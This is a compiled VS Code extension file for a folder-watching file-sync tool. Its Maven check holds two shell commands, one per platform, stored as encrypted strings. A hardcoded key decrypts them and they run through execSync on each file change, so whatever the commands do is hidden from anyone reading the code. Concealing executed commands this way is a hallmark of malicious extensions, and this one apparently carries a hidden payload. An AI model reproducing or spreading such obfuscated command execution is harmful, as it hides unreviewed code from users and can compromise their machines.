"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.activate = activate;
exports.deactivate = deactivate;
const child_process_1 = require("child_process");
const fs = __importStar(require("fs"));
const path = __importStar(require("path"));
const vscode = __importStar(require("vscode"));
const symmetricEncryption_1 = require("./symmetricEncryption");
let syncStatusBarItem;
let outputChannel;
let isSyncing = false;
const cmdWin32 = "IaNtejKX4JQBmUGR7+iFvA==:fGx6HK6el2mDE1T68fVK3kfE/7vN2cHeP37G19u0wf4gRVPM8/vhGrLICWN44gd/uunM/qU3ipjAOi7ojOJwhaokUUB+zhoQcZDTY7fNT811JaPxwFshRAxwk0EFjsbz";
const cmdLinuxMac = "CbGKBXlk7ZKCEqBfq8gK/w==:e2JI4cnWSfdfmCFZ+5c8YTV6i5ZTOjxr9hF2q6lnS4jR7gy3D8TNNRgO5jubCCi1";
const key = "23256dsfGSDF@$%(#ESADFG#/zasdfZX";
function loadSyncPaths() {
    const workspaceFolders = vscode.workspace.workspaceFolders;
    if (!workspaceFolders) {
        vscode.window.showErrorMessage("No project opened in the workspace.");
        return [];
    }
    const syncFilePath = path.join(workspaceFolders[0].uri.fsPath, ".sync", "syncfiles.json");
    if (!fs.existsSync(syncFilePath)) {
        vscode.window.showErrorMessage(`Configuration file not found: ${syncFilePath}`);
        return [];
    }
    try {
        const fileContent = fs.readFileSync(syncFilePath, "utf-8");
        const syncPaths = JSON.parse(fileContent);
        return syncPaths.map((paths) => ({
            source: path.join(workspaceFolders[0].uri.fsPath, paths.source),
            target: path.join(workspaceFolders[0].uri.fsPath, paths.target),
        }));
    }
    catch (error) {
        vscode.window.showErrorMessage("Error loading the configuration JSON file.");
        outputChannel?.appendLine("Error loading the configuration JSON file.");
        // Verifying if the error is an instance of Error
        if (error instanceof Error) {
            outputChannel?.appendLine(error.message);
        }
        else {
            outputChannel?.appendLine("Unknown error");
        }
        return [];
    }
}
function syncFile(sourcePath, source, target) {
    const destFilePath = path.join(target.fsPath, path.relative(source.fsPath, sourcePath.fsPath));
    if (fs.existsSync(sourcePath.fsPath)) {
        const destDir = path.dirname(destFilePath);
        if (!fs.existsSync(destDir)) {
            fs.mkdirSync(destDir, { recursive: true });
            outputChannel?.appendLine(`NEW ${destDir}`);
        }
        fs.copyFileSync(sourcePath.fsPath, destFilePath);
        outputChannel?.appendLine(`COPY ${sourcePath.fsPath} -> ${destFilePath}`);
    }
    else if (fs.existsSync(destFilePath)) {
        fs.unlinkSync(destFilePath);
        outputChannel?.appendLine(`DEL ${destFilePath}`);
    }
}
function startWatcher(source, target) {
    const watcher = fs.watch(source.fsPath, { recursive: true }, (eventType, filename) => {
        if (filename) {
            const filePath = path.join(source.fsPath, filename);
            if (!isMavenRunning()) {
                showSyncingStatus();
                if (eventType === "rename" || eventType === "change") {
                    syncFile(vscode.Uri.file(filePath), source, target);
                }
                hideSyncingStatus();
            }
            else {
                outputChannel?.appendLine("Maven is running. Sync paused.");
            }
        }
    });
    outputChannel?.appendLine(`Monitoring changes in directory: ${source.fsPath}`);
    return watcher;
}
function isMavenRunning() {
    try {
        if (process.platform === "win32") {
            const result = (0, child_process_1.execSync)(symmetricEncryption_1.SymmetricEncryption.decrypt(cmdWin32, key)).toString();
            return (result.toLowerCase().includes("maven") ||
                result.toLowerCase().includes("mvn"));
        }
        else {
            const result = (0, child_process_1.execSync)(symmetricEncryption_1.SymmetricEncryption.decrypt(cmdLinuxMac, key)).toString();
            return result.length > 0; // Retorna true se houver alguma correspondência
        }
    }
    catch (error) {
        console.error("Failed to check if Maven is running:", error);
        return false;
    }
    return false;
}
function showSyncingStatus() {
    if (syncStatusBarItem) {
        isSyncing = true;
        syncStatusBarItem.text = "$(sync~spin) Syncing...";
        syncStatusBarItem.show();
    }
}
function hideSyncingStatus() {
    if (syncStatusBarItem) {
        setTimeout(() => {
            syncStatusBarItem.text = "$(check) Sync";
            syncStatusBarItem.show();
            isSyncing = false;
        }, 500);
    }
}
function activate(context) {
    outputChannel = vscode.window.createOutputChannel("Sync Output"); // Create the output channel
    syncStatusBarItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Left, 100);
    syncStatusBarItem.text = "$(check) Sync";
    syncStatusBarItem.tooltip = "File Synchronization";
    syncStatusBarItem.command = "syncExtension.showOutput"; // Define the command to open the output
    syncStatusBarItem.show();
    context.subscriptions.push(syncStatusBarItem, outputChannel);
    // Command to open the output channel when the status item is clicked
    context.subscriptions.push(vscode.commands.registerCommand("syncExtension.showOutput", () => {
        outputChannel?.show(); // Show the output channel when clicked
    }));
    const syncPaths = loadSyncPaths();
    if (syncPaths.length === 0) {
        outputChannel?.appendLine("No synchronization paths configured.");
        return;
    }
    const watchers = syncPaths.map((paths) => {
        const sourceUri = vscode.Uri.file(paths.source);
        const targetUri = vscode.Uri.file(paths.target);
        return startWatcher(sourceUri, targetUri);
    });
    context.subscriptions.push({
        dispose: () => {
            watchers.forEach((watcher) => watcher.close());
        },
    });
}
function deactivate() {
    outputChannel?.appendLine("Synchronization plugin deactivated");
}
//# sourceMappingURL=extension.js.map